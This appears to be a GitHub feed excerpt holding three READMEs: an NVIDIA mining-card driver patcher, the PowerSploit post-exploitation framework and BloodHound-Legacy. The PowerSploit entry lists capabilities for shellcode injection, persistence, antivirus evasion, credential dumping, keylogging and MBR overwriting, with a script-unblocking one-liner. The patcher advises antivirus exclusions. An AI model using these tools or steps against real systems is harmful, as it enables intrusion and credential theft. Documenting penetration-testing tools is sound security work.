 &lt;li&gt;472.12 — if you want to use a mining card paired with an old NVIDIA discrete graphic (GeForce 600 Series, GeForce GT 710-740, GeForce GTX 760-780 Ti).&lt;/li&gt; 
 &lt;li&gt;446.14 — if you want to use a mining card (only PXXX, not CMP-cards) in the SLI setup (see &lt;a href=&quot;https://raw.githubusercontent.com/dartraiden/NVIDIA-patcher/master/#SLI-hack&quot;&gt;SLI hack&lt;/a&gt;).&lt;/li&gt; 
&lt;/ul&gt; 
&lt;p&gt;The patched driver comes in two versions:&lt;/p&gt; 
&lt;ul&gt; 
 &lt;li&gt;Regular;&lt;/li&gt; 
 &lt;li&gt;&lt;code&gt;NVENC-NvFBC-&lt;/code&gt; prefixed (&lt;a href=&quot;https://github.com/keylase/nvidia-patch/tree/master/win&quot;&gt;removed&lt;/a&gt; restriction on maximum number of simultaneous NVENC video encoding; &lt;a href=&quot;https://github.com/keylase/nvidia-patch/tree/master/win/nvfbcwrp&quot;&gt;enabled&lt;/a&gt; NvFBC for all NvFBC-targeted applications).&lt;/li&gt; 
&lt;/ul&gt; 
&lt;p&gt;&lt;strong&gt;Attention: Do not use NVENC- prefixed package if your mining card does not have hardware NVENC support. In this case driver will cause problems (crashes) in applications supporting NVENC.&lt;/strong&gt;&lt;/p&gt; 
&lt;ol start=&quot;2&quot;&gt; 
 &lt;li&gt;Download the official driver package from the NVIDIA website.&lt;/li&gt; 
 &lt;li&gt;Download &lt;a href=&quot;https://www.wagnardsoft.com/display-driver-uninstaller-ddu-&quot;&gt;Display Driver Uninstaller&lt;/a&gt; (DDU).&lt;/li&gt; 
 &lt;li&gt;Unpack the official driver package with 7-Zip / WinRAR / etc.&lt;/li&gt; 
 &lt;li&gt;Replace original files with patched ones.&lt;/li&gt; 
 &lt;li&gt;Unplug the network cable / disable Wi-Fi on your PC and clean the installed NVIDIA driver with DDU. Reboot PC.&lt;/li&gt; 
 &lt;li&gt;Run setup.exe.&lt;/li&gt; 
&lt;/ol&gt; 
&lt;p&gt;During installation, you can select the option &quot;Spoof GPU name&quot; so that the graphics adapter appears in the device manager with the name of the corresponding gaming video card.&lt;/p&gt; 
&lt;p&gt;Result:&lt;/p&gt; 
&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/dartraiden/NVIDIA-patcher/master/docs/GPU-Z.png&quot; alt=&quot;Screenshot of GPU-Z window&quot;&gt;&lt;/p&gt; 
&lt;p&gt;Now you can plug in the network cable / enable Wi-Fi back.&lt;/p&gt; 
&lt;p&gt;8.1. In Windows 10 open the NVIDIA control panel → 3D settings → Manage 3D settings → set &quot;High-performance NVIDIA processor&quot; as the preferred graphics processor:&lt;/p&gt; 
&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/dartraiden/NVIDIA-patcher/master/docs/NVIDIA%20Manage%203D%20Settings.jpg&quot; alt=&quot;Screenshot of NVIDIA control panel&quot;&gt; &lt;img src=&quot;https://raw.githubusercontent.com/dartraiden/NVIDIA-patcher/master/docs/High%20Performance%20NVIDIA%20Processor.jpg&quot; alt=&quot;Screenshot of &amp;quot;High-performance NVIDIA processor&amp;quot; option&quot;&gt;&lt;/p&gt; 
&lt;p&gt;8.2. In Windows 11 open Settings → System → Display → Graphics → Change default graphic settings → set mining card as the default high-performance graphic adapter:&lt;/p&gt; 
&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/dartraiden/NVIDIA-patcher/master/docs/Windows%20Default%20High-performance%20GPU.png&quot; alt=&quot;Screenshot of &amp;quot;Default High-performance GPU&amp;quot; option&quot;&gt;&lt;/p&gt; 
&lt;h2&gt;SLI hack&lt;/h2&gt; 
&lt;p&gt;It is possible to pair together different GPUs of similar generation/architecture to work together in SLI (Note: Mixing different VRAM sizes may cause some instability or stop SLI from functioning properly). It can also enable SLI on some non-SLI/Crossfire compatible motherboards, making it a replacement for the discontinued HyperSLI program (Note: The SLI support on non-multi-GPU motherboards is not guaranteed).&lt;/p&gt; 
&lt;p&gt;Mandatory requirements:&lt;/p&gt; 
&lt;ul&gt; 
 &lt;li&gt;Driver version 446.14 (exactly this version).&lt;/li&gt; 
 &lt;li&gt;The first three symbols of Device ID for both cards must match. Go to Windows Device Manager → Right-click on device → Properties → Switch to the &quot;Details&quot; tab → Select &quot;Hardware IDs&quot; from the combo box.&lt;/li&gt; 
&lt;/ul&gt; 
&lt;p&gt;As an example:&lt;br&gt; NVIDIA_DEV.&lt;code&gt;118&lt;/code&gt;5.098A.10DE = &quot;NVIDIA GeForce GTX 660&quot;&lt;br&gt; NVIDIA_DEV.&lt;code&gt;118&lt;/code&gt;5.106F.10DE = &quot;NVIDIA GeForce GTX 760&quot;&lt;/p&gt; 
&lt;p&gt;Thus, for example, GTX 1070 and GTX 1080 can work together, but GTX 960 and GTX 1060 cannot.&lt;/p&gt; 
&lt;h2&gt;Troubleshooting&lt;/h2&gt; 
&lt;ul&gt; 
 &lt;li&gt; &lt;p&gt;Problem: Antivirus software removes driver.&lt;br&gt; Solution: Add the &lt;code&gt;C:\Windows\System32\DriverStore&lt;/code&gt; directory to the exceptions of Windows Defender (or other antivirus you use). Reinstall the driver after that.&lt;/p&gt; &lt;/li&gt; 
 &lt;li&gt; &lt;p&gt;Problem: A BSOD after installing the driver.&lt;br&gt; Solution: Turn off the &lt;a href=&quot;https://www.howtogeek.com/756935/how-to-enable-hardware-accelerated-gpu-scheduling-in-windows-11/#enable-hardware-accelerated-gpu-scheduling-in-windows-11&quot;&gt;Hardware Accelerated GPU Scheduling&lt;/a&gt;.&lt;/p&gt; &lt;/li&gt; 
&lt;/ul&gt; 
&lt;h1&gt;If you don&#39;t trust me and want to patch the driver by yourself, see &lt;a href=&quot;https://raw.githubusercontent.com/dartraiden/NVIDIA-patcher/master/docs/README-PATCHER.md&quot;&gt;how to use patcher&lt;/a&gt;.&lt;/h1&gt; 
&lt;h2&gt;Unlocking full x16 PCI-E lines on the CMP-cards&lt;/h2&gt; 
&lt;p&gt;TL;DR: You need to solder the missing elements near the PCI-E slot.&lt;/p&gt; 
&lt;p&gt;English: &lt;a href=&quot;https://www.youtube.com/watch?v=AlLid4uGxpw&quot;&gt;https://www.youtube.com/watch?v=AlLid4uGxpw&lt;/a&gt;&lt;/p&gt; 
&lt;p&gt;Russian: &lt;a href=&quot;https://www.youtube.com/watch?v=twRIYq2p-38&quot;&gt;https://www.youtube.com/watch?v=twRIYq2p-38&lt;/a&gt;&lt;/p&gt; 
&lt;h2&gt;Using ShadowPlay, also known as the NVIDIA overlay&lt;/h2&gt; 
&lt;p&gt;Requires graphics card that supports NVENC.&lt;/p&gt; 
&lt;h3&gt;Recommended method: &lt;a href=&quot;https://www.nvidia.com/en-us/software/nvidia-app/&quot;&gt;NVIDIA App&lt;/a&gt;&lt;/h3&gt; 
&lt;h3&gt;Alternative method: GeForce Experience&lt;/h3&gt; 
&lt;p&gt;To use the ShadowPlay overlay to record gameplay, use the resource monitor or stream, you must follow these steps:&lt;/p&gt; 
&lt;ol&gt; 
 &lt;li&gt;Download and install &lt;a href=&quot;https://www.nvidia.com/en-us/geforce/geforce-experience/download/&quot;&gt;GeForce Experience&lt;/a&gt; (no need to log in).&lt;/li&gt; 
 &lt;li&gt;Go to the installation path of Nvidia GeForce Experience, usually located at &lt;code&gt;C:\Program Files\NVIDIA Corporation\NVIDIA GeForce Experience&lt;/code&gt;&lt;/li&gt; 
 &lt;li&gt;Once there, locate the executable named &quot;NVIDIA Share.exe&quot; and create a shortcut on your desktop.&lt;/li&gt; 
 &lt;li&gt;Right-click on the created desktop shortcut, go to properties, and in the &quot;Target&quot; field at the end of the path, add &lt;code&gt; --shadowplay&lt;/code&gt; while ensuring there&#39;s a space as shown in the picture. Then click OK.&lt;/li&gt; 
&lt;/ol&gt; 
&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/dartraiden/NVIDIA-patcher/master/docs/NVIDIA%20Share%20shortcut.png&quot; alt=&quot;Screenshot of NVIDIA Share shortcut&quot;&gt;&lt;/p&gt; 
&lt;ol start=&quot;4&quot;&gt; 
 &lt;li&gt;Now double-click on the shortcut, and you&#39;ll notice that nothing appears to happen. However, when you press &lt;code&gt;Alt+Z&lt;/code&gt;, the ShadowPlay overlay will open. Note: You do not need to double-click the shortcut again; this is a one-time setup. From now on, you can always open ShadowPlay by pressing &lt;code&gt;Alt+Z&lt;/code&gt;.&lt;/li&gt; 
&lt;/ol&gt; 
&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/dartraiden/NVIDIA-patcher/master/docs/ShadowPlay.png&quot; alt=&quot;Screenshot of ShadowPlay&quot;&gt;&lt;/p&gt; 
&lt;h2&gt;DirectX 12 on Haswell&lt;/h2&gt; 
&lt;p&gt;&lt;a href=&quot;https://www.techpowerup.com/288676/intel-disables-directx-12-api-loading-on-haswell-processors&quot;&gt;https://www.techpowerup.com/288676/intel-disables-directx-12-api-loading-on-haswell-processors&lt;/a&gt;&lt;/p&gt;</description>
    </item>
    
    <item>
      <title>PowerShellMafia/PowerSploit</title>
      <link>https://github.com/PowerShellMafia/PowerSploit</link>
      <description>&lt;p&gt;PowerSploit - A PowerShell Post-Exploitation Framework&lt;/p&gt;&lt;hr&gt;&lt;h2&gt;This project is no longer supported&lt;/h2&gt; 
&lt;h3&gt;PowerSploit is a collection of Microsoft PowerShell modules that can be used to aid penetration testers during all phases of an assessment. PowerSploit is comprised of the following modules and scripts:&lt;/h3&gt; 
&lt;h2&gt;CodeExecution&lt;/h2&gt; 
&lt;p&gt;&lt;strong&gt;Execute code on a target machine.&lt;/strong&gt;&lt;/p&gt; 
&lt;h4&gt;&lt;code&gt;Invoke-DllInjection&lt;/code&gt;&lt;/h4&gt; 
&lt;p&gt;Injects a Dll into the process ID of your choosing.&lt;/p&gt; 
&lt;h4&gt;&lt;code&gt;Invoke-ReflectivePEInjection&lt;/code&gt;&lt;/h4&gt; 
&lt;p&gt;Reflectively loads a Windows PE file (DLL/EXE) in to the powershell process, or reflectively injects a DLL in to a remote process.&lt;/p&gt; 
&lt;h4&gt;&lt;code&gt;Invoke-Shellcode&lt;/code&gt;&lt;/h4&gt; 
&lt;p&gt;Injects shellcode into the process ID of your choosing or within PowerShell locally.&lt;/p&gt; 
&lt;h4&gt;&lt;code&gt;Invoke-WmiCommand&lt;/code&gt;&lt;/h4&gt; 
&lt;p&gt;Executes a PowerShell ScriptBlock on a target computer and returns its formatted output using WMI as a C2 channel.&lt;/p&gt; 
&lt;h2&gt;ScriptModification&lt;/h2&gt; 
&lt;p&gt;&lt;strong&gt;Modify and/or prepare scripts for execution on a compromised machine.&lt;/strong&gt;&lt;/p&gt; 
&lt;h4&gt;&lt;code&gt;Out-EncodedCommand&lt;/code&gt;&lt;/h4&gt; 
&lt;p&gt;Compresses, Base-64 encodes, and generates command-line output for a PowerShell payload script.&lt;/p&gt; 
&lt;h4&gt;&lt;code&gt;Out-CompressedDll&lt;/code&gt;&lt;/h4&gt; 
&lt;p&gt;Compresses, Base-64 encodes, and outputs generated code to load a managed dll in memory.&lt;/p&gt; 
&lt;h4&gt;&lt;code&gt;Out-EncryptedScript&lt;/code&gt;&lt;/h4&gt; 
&lt;p&gt;Encrypts text files/scripts.&lt;/p&gt; 
&lt;h4&gt;&lt;code&gt;Remove-Comment&lt;/code&gt;&lt;/h4&gt; 
&lt;p&gt;Strips comments and extra whitespace from a script.&lt;/p&gt; 
&lt;h2&gt;Persistence&lt;/h2&gt; 
&lt;p&gt;&lt;strong&gt;Add persistence capabilities to a PowerShell script&lt;/strong&gt;&lt;/p&gt; 
&lt;h4&gt;&lt;code&gt;New-UserPersistenceOption&lt;/code&gt;&lt;/h4&gt; 
&lt;p&gt;Configure user-level persistence options for the Add-Persistence function.&lt;/p&gt; 
&lt;h4&gt;&lt;code&gt;New-ElevatedPersistenceOption&lt;/code&gt;&lt;/h4&gt; 
&lt;p&gt;Configure elevated persistence options for the Add-Persistence function.&lt;/p&gt; 
&lt;h4&gt;&lt;code&gt;Add-Persistence&lt;/code&gt;&lt;/h4&gt; 
&lt;p&gt;Add persistence capabilities to a script.&lt;/p&gt; 
&lt;h4&gt;&lt;code&gt;Install-SSP&lt;/code&gt;&lt;/h4&gt; 
&lt;p&gt;Installs a security support provider (SSP) dll.&lt;/p&gt; 
&lt;h4&gt;&lt;code&gt;Get-SecurityPackages&lt;/code&gt;&lt;/h4&gt; 
&lt;p&gt;Enumerates all loaded security packages (SSPs).&lt;/p&gt; 
&lt;h2&gt;AntivirusBypass&lt;/h2&gt; 
&lt;p&gt;&lt;strong&gt;AV doesn&#39;t stand a chance against PowerShell!&lt;/strong&gt;&lt;/p&gt; 
&lt;h4&gt;&lt;code&gt;Find-AVSignature&lt;/code&gt;&lt;/h4&gt; 
&lt;p&gt;Locates single Byte AV signatures utilizing the same method as DSplit from &quot;class101&quot;.&lt;/p&gt; 
&lt;h2&gt;Exfiltration&lt;/h2&gt; 
&lt;p&gt;&lt;strong&gt;All your data belong to me!&lt;/strong&gt;&lt;/p&gt; 
&lt;h4&gt;&lt;code&gt;Invoke-TokenManipulation&lt;/code&gt;&lt;/h4&gt; 
&lt;p&gt;Lists available logon tokens. Creates processes with other users logon tokens, and impersonates logon tokens in the current thread.&lt;/p&gt; 
&lt;h4&gt;&lt;code&gt;Invoke-CredentialInjection&lt;/code&gt;&lt;/h4&gt; 
&lt;p&gt;Create logons with clear-text credentials without triggering a suspicious Event ID 4648 (Explicit Credential Logon).&lt;/p&gt; 
&lt;h4&gt;&lt;code&gt;Invoke-NinjaCopy&lt;/code&gt;&lt;/h4&gt; 
&lt;p&gt;Copies a file from an NTFS partitioned volume by reading the raw volume and parsing the NTFS structures.&lt;/p&gt; 
&lt;h4&gt;&lt;code&gt;Invoke-Mimikatz&lt;/code&gt;&lt;/h4&gt; 
&lt;p&gt;Reflectively loads Mimikatz 2.0 in memory using PowerShell. Can be used to dump credentials without writing anything to disk. Can be used for any functionality provided with Mimikatz.&lt;/p&gt; 
&lt;h4&gt;&lt;code&gt;Get-Keystrokes&lt;/code&gt;&lt;/h4&gt; 
&lt;p&gt;Logs keys pressed, time and the active window.&lt;/p&gt; 
&lt;h4&gt;&lt;code&gt;Get-GPPPassword&lt;/code&gt;&lt;/h4&gt; 
&lt;p&gt;Retrieves the plaintext password and other information for accounts pushed through Group Policy Preferences.&lt;/p&gt; 
&lt;h4&gt;&lt;code&gt;Get-GPPAutologon&lt;/code&gt;&lt;/h4&gt; 
&lt;p&gt;Retrieves autologon username and password from registry.xml if pushed through Group Policy Preferences.&lt;/p&gt; 
&lt;h4&gt;&lt;code&gt;Get-TimedScreenshot&lt;/code&gt;&lt;/h4&gt; 
&lt;p&gt;A function that takes screenshots at a regular interval and saves them to a folder.&lt;/p&gt; 
&lt;h4&gt;&lt;code&gt;New-VolumeShadowCopy&lt;/code&gt;&lt;/h4&gt; 
&lt;p&gt;Creates a new volume shadow copy.&lt;/p&gt; 
&lt;h4&gt;&lt;code&gt;Get-VolumeShadowCopy&lt;/code&gt;&lt;/h4&gt; 
&lt;p&gt;Lists the device paths of all local volume shadow copies.&lt;/p&gt; 
&lt;h4&gt;&lt;code&gt;Mount-VolumeShadowCopy&lt;/code&gt;&lt;/h4&gt; 
&lt;p&gt;Mounts a volume shadow copy.&lt;/p&gt; 
&lt;h4&gt;&lt;code&gt;Remove-VolumeShadowCopy&lt;/code&gt;&lt;/h4&gt; 
&lt;p&gt;Deletes a volume shadow copy.&lt;/p&gt; 
&lt;h4&gt;&lt;code&gt;Get-VaultCredential&lt;/code&gt;&lt;/h4&gt; 
&lt;p&gt;Displays Windows vault credential objects including cleartext web credentials.&lt;/p&gt; 
&lt;h4&gt;&lt;code&gt;Out-Minidump&lt;/code&gt;&lt;/h4&gt; 
&lt;p&gt;Generates a full-memory minidump of a process.&lt;/p&gt; 
&lt;h4&gt;&lt;code&gt;Get-MicrophoneAudio&lt;/code&gt;&lt;/h4&gt; 
&lt;p&gt;Records audio from system microphone and saves to disk&lt;/p&gt; 
&lt;h2&gt;Mayhem&lt;/h2&gt; 
&lt;p&gt;&lt;strong&gt;Cause general mayhem with PowerShell.&lt;/strong&gt;&lt;/p&gt; 
&lt;h4&gt;&lt;code&gt;Set-MasterBootRecord&lt;/code&gt;&lt;/h4&gt; 
&lt;p&gt;Proof of concept code that overwrites the master boot record with the message of your choice.&lt;/p&gt; 
&lt;h4&gt;&lt;code&gt;Set-CriticalProcess&lt;/code&gt;&lt;/h4&gt; 
&lt;p&gt;Causes your machine to blue screen upon exiting PowerShell.&lt;/p&gt; 
&lt;h2&gt;Privesc&lt;/h2&gt; 
&lt;p&gt;&lt;strong&gt;Tools to help with escalating privileges on a target.&lt;/strong&gt;&lt;/p&gt; 
&lt;h4&gt;&lt;code&gt;PowerUp&lt;/code&gt;&lt;/h4&gt; 
&lt;p&gt;Clearing house of common privilege escalation checks, along with some weaponization vectors.&lt;/p&gt; 
&lt;h2&gt;Recon&lt;/h2&gt; 
&lt;p&gt;&lt;strong&gt;Tools to aid in the reconnaissance phase of a penetration test.&lt;/strong&gt;&lt;/p&gt; 
&lt;h4&gt;&lt;code&gt;Invoke-Portscan&lt;/code&gt;&lt;/h4&gt; 
&lt;p&gt;Does a simple port scan using regular sockets, based (pretty) loosely on nmap.&lt;/p&gt; 
&lt;h4&gt;&lt;code&gt;Get-HttpStatus&lt;/code&gt;&lt;/h4&gt; 
&lt;p&gt;Returns the HTTP Status Codes and full URL for specified paths when provided with a dictionary file.&lt;/p&gt; 
&lt;h4&gt;&lt;code&gt;Invoke-ReverseDnsLookup&lt;/code&gt;&lt;/h4&gt; 
&lt;p&gt;Scans an IP address range for DNS PTR records.&lt;/p&gt; 
&lt;h4&gt;&lt;code&gt;PowerView&lt;/code&gt;&lt;/h4&gt; 
&lt;p&gt;PowerView is series of functions that performs network and Windows domain enumeration and exploitation.&lt;/p&gt; 
&lt;h2&gt;Recon\Dictionaries&lt;/h2&gt; 
&lt;p&gt;&lt;strong&gt;A collection of dictionaries used to aid in the reconnaissance phase of a penetration test. Dictionaries were taken from the following sources.&lt;/strong&gt;&lt;/p&gt; 
&lt;ul&gt; 
 &lt;li&gt;admin.txt - &lt;a href=&quot;http://cirt.net/nikto2/&quot;&gt;http://cirt.net/nikto2/&lt;/a&gt;&lt;/li&gt; 
 &lt;li&gt;generic.txt - &lt;a href=&quot;http://sourceforge.net/projects/yokoso/files/yokoso-0.1/&quot;&gt;http://sourceforge.net/projects/yokoso/files/yokoso-0.1/&lt;/a&gt;&lt;/li&gt; 
 &lt;li&gt;sharepoint.txt - &lt;a href=&quot;http://www.stachliu.com/resources/tools/sharepoint-hacking-diggity-project/&quot;&gt;http://www.stachliu.com/resources/tools/sharepoint-hacking-diggity-project/&lt;/a&gt;&lt;/li&gt; 
&lt;/ul&gt; 
&lt;h2&gt;License&lt;/h2&gt; 
&lt;p&gt;The PowerSploit project and all individual scripts are under the &lt;a href=&quot;https://raw.github.com/mattifestation/PowerSploit/master/LICENSE&quot;&gt;BSD 3-Clause license&lt;/a&gt; unless explicitly noted otherwise.&lt;/p&gt; 
&lt;h2&gt;Usage&lt;/h2&gt; 
&lt;p&gt;Refer to the comment-based help in each individual script for detailed usage information.&lt;/p&gt; 
&lt;p&gt;To install this module, drop the entire PowerSploit folder into one of your module directories. The default PowerShell module paths are listed in the $Env:PSModulePath environment variable.&lt;/p&gt; 
&lt;p&gt;The default per-user module path is: &quot;$Env:HomeDrive$Env:HOMEPATH\Documents\WindowsPowerShell\Modules&quot; The default computer-level module path is: &quot;$Env:windir\System32\WindowsPowerShell\v1.0\Modules&quot;&lt;/p&gt; 
&lt;p&gt;To use the module, type &lt;code&gt;Import-Module PowerSploit&lt;/code&gt;&lt;/p&gt; 
&lt;p&gt;To see the commands imported, type &lt;code&gt;Get-Command -Module PowerSploit&lt;/code&gt;&lt;/p&gt; 
&lt;p&gt;If you&#39;re running PowerShell v3 and you want to remove the annoying &#39;Do you really want to run scripts downloaded from the Internet&#39; warning, once you&#39;ve placed PowerSploit into your module path, run the following one-liner: &lt;code&gt;$Env:PSModulePath.Split(&#39;;&#39;) | % { if ( Test-Path (Join-Path $_ PowerSploit) ) {Get-ChildItem $_ -Recurse | Unblock-File} }&lt;/code&gt;&lt;/p&gt; 
&lt;p&gt;For help on each individual command, Get-Help is your friend.&lt;/p&gt; 
&lt;p&gt;Note: The tools contained within this module were all designed such that they can be run individually. Including them in a module simply lends itself to increased portability.&lt;/p&gt; 
&lt;h2&gt;Contribution Rules&lt;/h2&gt; 
&lt;p&gt;We need contributions! If you have a great idea for PowerSploit, we&#39;d love to add it. New additions will require the following:&lt;/p&gt; 
&lt;ul&gt; 
 &lt;li&gt;The script must adhere to the style guide. Any exceptions to the guide line would need an explicit, valid reason.&lt;/li&gt; 
 &lt;li&gt;The module manifest needs to be updated to reflect the new function being added.&lt;/li&gt; 
 &lt;li&gt;A brief description of the function should be added to this README.md&lt;/li&gt; 
 &lt;li&gt;Pester tests must accompany all new functions. See the Tests folder for examples but we are looking for tests that at least cover the basics by testing for expected/unexpected input/output and that the function exhibits desired functionality. Make sure the function is passing all tests (preferably in mutiple OSes) prior to submitting a pull request. Thanks!&lt;/li&gt; 
&lt;/ul&gt; 
&lt;h2&gt;Script Style Guide&lt;/h2&gt; 
&lt;p&gt;&lt;strong&gt;For all contributors and future contributors to PowerSploit, I ask that you follow this style guide when writing your scripts/modules.&lt;/strong&gt;&lt;/p&gt; 
&lt;ul&gt; 
 &lt;li&gt; &lt;p&gt;Avoid Write-Host &lt;strong&gt;at all costs&lt;/strong&gt;. PowerShell functions/cmdlets are not command-line utilities! Pull requests containing code that uses Write-Host will not be considered. You should output custom objects instead. For more information on creating custom objects, read these articles:&lt;/p&gt; 
  &lt;ul&gt; 
   &lt;li&gt;&lt;a href=&quot;http://blogs.technet.com/b/heyscriptingguy/archive/2011/05/19/create-custom-objects-in-your-powershell-script.aspx&quot;&gt;http://blogs.technet.com/b/heyscriptingguy/archive/2011/05/19/create-custom-objects-in-your-powershell-script.aspx&lt;/a&gt;&lt;/li&gt; 
   &lt;li&gt;&lt;a href=&quot;http://technet.microsoft.com/en-us/library/ff730946.aspx&quot;&gt;http://technet.microsoft.com/en-us/library/ff730946.aspx&lt;/a&gt;&lt;/li&gt; 
  &lt;/ul&gt; &lt;/li&gt; 
 &lt;li&gt; &lt;p&gt;If you want to display relevant debugging information to the screen, use Write-Verbose. The user can always just tack on &#39;-Verbose&#39;.&lt;/p&gt; &lt;/li&gt; 
 &lt;li&gt; &lt;p&gt;Always provide descriptive, comment-based help for every script. Also, be sure to include your name and a BSD 3-Clause license (unless there are extenuating circumstances that prevent the application of the BSD license).&lt;/p&gt; &lt;/li&gt; 
 &lt;li&gt; &lt;p&gt;Make sure all functions follow the proper PowerShell verb-noun agreement. Use Get-Verb to list the default verbs used by PowerShell. Exceptions to supported verbs will be considered on a case-by-case basis.&lt;/p&gt; &lt;/li&gt; 
 &lt;li&gt; &lt;p&gt;I prefer that variable names be capitalized and be as descriptive as possible.&lt;/p&gt; &lt;/li&gt; 
 &lt;li&gt; &lt;p&gt;Provide logical spacing in between your code. Indent your code to make it more readable.&lt;/p&gt; &lt;/li&gt; 
 &lt;li&gt; &lt;p&gt;If you find yourself repeating code, write a function.&lt;/p&gt; &lt;/li&gt; 
 &lt;li&gt; &lt;p&gt;Catch all anticipated errors and provide meaningful output. If you have an error that should stop execution of the script, use &#39;Throw&#39;. If you have an error that doesn&#39;t need to stop execution, use Write-Error.&lt;/p&gt; &lt;/li&gt; 
 &lt;li&gt; &lt;p&gt;If you are writing a script that interfaces with the Win32 API, try to avoid compiling C# inline with Add-Type. Try to use the PSReflect module, if possible.&lt;/p&gt; &lt;/li&gt; 
 &lt;li&gt; &lt;p&gt;Do not use hardcoded paths. A script should be useable right out of the box. No one should have to modify the code unless they want to.&lt;/p&gt; &lt;/li&gt; 
 &lt;li&gt; &lt;p&gt;PowerShell v2 compatibility is highly desired.&lt;/p&gt; &lt;/li&gt; 
 &lt;li&gt; &lt;p&gt;Use positional parameters and make parameters mandatory when it makes sense to do so. For example, I&#39;m looking for something like the following:&lt;/p&gt; 
  &lt;ul&gt; 
   &lt;li&gt;&lt;code&gt;[Parameter(Position = 0, Mandatory = $True)]&lt;/code&gt;&lt;/li&gt; 
  &lt;/ul&gt; &lt;/li&gt; 
 &lt;li&gt; &lt;p&gt;Don&#39;t use any aliases unless it makes sense for receiving pipeline input. They make code more difficult to read for people who are unfamiliar with a particular alias.&lt;/p&gt; &lt;/li&gt; 
 &lt;li&gt; &lt;p&gt;Try not to let commands run on for too long. For example, a pipeline is a natural place for a line break.&lt;/p&gt; &lt;/li&gt; 
 &lt;li&gt; &lt;p&gt;Don&#39;t go overboard with inline comments. Only use them when certain aspects of the code might be confusing to a reader.&lt;/p&gt; &lt;/li&gt; 
 &lt;li&gt; &lt;p&gt;Rather than using Out-Null to suppress unwanted/irrelevant output, save the unwanted output to $null. Doing so provides a slight performance enhancement.&lt;/p&gt; &lt;/li&gt; 
 &lt;li&gt; &lt;p&gt;Use default values for your parameters when it makes sense. Ideally, you want a script that will work without requiring any parameters.&lt;/p&gt; &lt;/li&gt; 
 &lt;li&gt; &lt;p&gt;If a script creates complex custom objects, include a ps1xml file that will properly format the object&#39;s output.&lt;/p&gt; &lt;/li&gt; 
&lt;/ul&gt;</description>
    </item>
    
    <item>
      <title>SpecterOps/BloodHound-Legacy</title>
      <link>https://github.com/SpecterOps/BloodHound-Legacy</link>
      <description>&lt;p&gt;Six Degrees of Domain Admin&lt;/p&gt;&lt;hr&gt;&lt;h1&gt;Latest Version of BloodHound Community Edition is Released&lt;/h1&gt; 
&lt;p&gt;For the latest version of BloodHound you may follow &lt;a href=&quot;https://github.com/SpecterOps/BloodHound&quot;&gt;this link to the BloodHound Community Edition repository&lt;/a&gt;.&lt;/p&gt; 
&lt;h2&gt;Deprecation Notice&lt;/h2&gt; 
&lt;p&gt;This repository will be archived in the near future.&lt;/p&gt; 
&lt;hr&gt; 
&lt;p&gt;&lt;a href=&quot;https://github.com/BloodHoundAD/BloodHound/actions/workflows/build.yml&quot;&gt;&lt;img src=&quot;https://github.com/BloodHoundAD/BloodHound/actions/workflows/build.yml/badge.svg?sanitize=true&quot; alt=&quot;Build&quot;&gt;&lt;/a&gt; &lt;a href=&quot;https://github.com/BloodHoundAD/BloodHound/releases/latest&quot;&gt;&lt;img src=&quot;https://img.shields.io/github/v/release/BloodHoundAD/BloodHound&quot; alt=&quot;GitHub release (latest SemVer)&quot;&gt;&lt;/a&gt; &lt;img src=&quot;https://img.shields.io/github/downloads/BloodHoundAD/BloodHound/total&quot; alt=&quot;GitHub all releases&quot;&gt;&lt;/p&gt; 
&lt;h1&gt;Getting Started with BloodHound&lt;/h1&gt; 
&lt;p&gt;To get started with BloodHound, check out the &lt;a href=&quot;https://bloodhound.readthedocs.io/en/latest/index.html&quot;&gt;BloodHound docs.&lt;/a&gt;&lt;/p&gt; 
&lt;h1&gt;About BloodHound&lt;/h1&gt; 
&lt;p&gt;BloodHound is a single page Javascript web application, built on top of &lt;a href=&quot;http://linkurio.us/&quot;&gt;Linkurious&lt;/a&gt;, compiled with &lt;a href=&quot;http://electron.atom.io/&quot;&gt;Electron&lt;/a&gt;, with a &lt;a href=&quot;https://neo4j.com/&quot;&gt;Neo4j&lt;/a&gt; database fed by a C# data collector.&lt;/p&gt; 
&lt;p&gt;BloodHound uses graph theory to reveal the hidden and often unintended relationships within an Active Directory or Azure environment. Attackers can use BloodHound to easily identify highly complex attack paths that would otherwise be impossible to quickly identify. Defenders can use BloodHound to identify and eliminate those same attack paths. Both blue and red teams can use BloodHound to easily gain a deeper understanding of privilege relationships in an Active Directory or Azure environment.&lt;/p&gt; 
&lt;p&gt;BloodHound was created by &lt;a href=&quot;https://www.twitter.com/_wald0&quot;&gt;@_wald0&lt;/a&gt;, &lt;a href=&quot;https://twitter.com/CptJesus&quot;&gt;@CptJesus&lt;/a&gt;, and &lt;a href=&quot;https://twitter.com/harmj0y&quot;&gt;@harmj0y&lt;/a&gt;.&lt;/p&gt; 
&lt;p&gt;BloodHound is maintained by the &lt;a href=&quot;https://bloodhoundenterprise.io/&quot;&gt;BloodHound Enterprise&lt;/a&gt; team.&lt;/p&gt; 
&lt;h1&gt;About BloodHound Enterprise&lt;/h1&gt; 
&lt;p&gt;&lt;a href=&quot;https://bloodhoundenterprise.io/&quot;&gt;BloodHound Enterprise&lt;/a&gt; is an Attack Path Management solution that continuously maps and quantifies Active Directory Attack Paths. You can remove millions, even billions of Attack Paths within your existing architecture and eliminate the attacker’s easiest, most reliable, and most attractive techniques.&lt;/p&gt; 
&lt;h1&gt;Downloading BloodHound Binaries&lt;/h1&gt; 
&lt;p&gt;Pre-Compiled BloodHound binaries can be found &lt;a href=&quot;https://github.com/BloodHoundAD/BloodHound/releases&quot;&gt;here&lt;/a&gt;.&lt;/p&gt; 
&lt;p&gt;The rolling release will always be updated to the most recent source. Tagged releases are considered &quot;stable&quot; but will likely not have new features or fixes.&lt;/p&gt; 
&lt;h1&gt;Creating example data&lt;/h1&gt; 
&lt;p&gt;A sample database generator can be found &lt;a href=&quot;https://github.com/BloodHoundAD/BloodHound-Tools/tree/master/DBCreator&quot;&gt;here&lt;/a&gt;&lt;/p&gt; 
&lt;p&gt;You can create your own example Active Directory environment using &lt;a href=&quot;https://github.com/davidprowe/BadBlood&quot;&gt;BadBlood&lt;/a&gt;.&lt;/p&gt; 
&lt;h1&gt;License&lt;/h1&gt; 
&lt;p&gt;BloodHound uses graph theory to reveal hidden relationships and attack paths in an Active Directory environment. Copyright (C) 2016-2023 Specter Ops Inc.&lt;/p&gt; 
